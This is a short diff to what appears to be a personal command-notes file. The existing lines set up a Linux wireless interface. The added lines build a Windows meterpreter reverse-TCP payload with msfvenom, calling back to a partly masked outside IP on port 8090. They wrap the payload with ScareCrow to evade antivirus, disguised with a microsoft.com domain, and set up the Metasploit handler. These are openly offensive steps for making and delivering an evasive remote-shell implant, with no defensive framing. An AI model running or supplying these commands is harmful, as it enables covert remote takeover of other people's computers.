@@ -8,3 +8,8 @@ sudo ip link set dev wlp6s0 up
 ip link show wlp6s0
 
 insufficient permissions: Too many open files in system
+
+
+sudo msfvenom -p windows/x64/meterpreter/reverse_tcp -e php/base64  LHOST=100.72.XX.XX LPORT=8090 -f raw -o data.exe
+sudo ./ScareCrow -I /home/<usr>/data.bin -domain www.microsoft.com
+set payload windows/x64/meterpreter/reverse_tcp
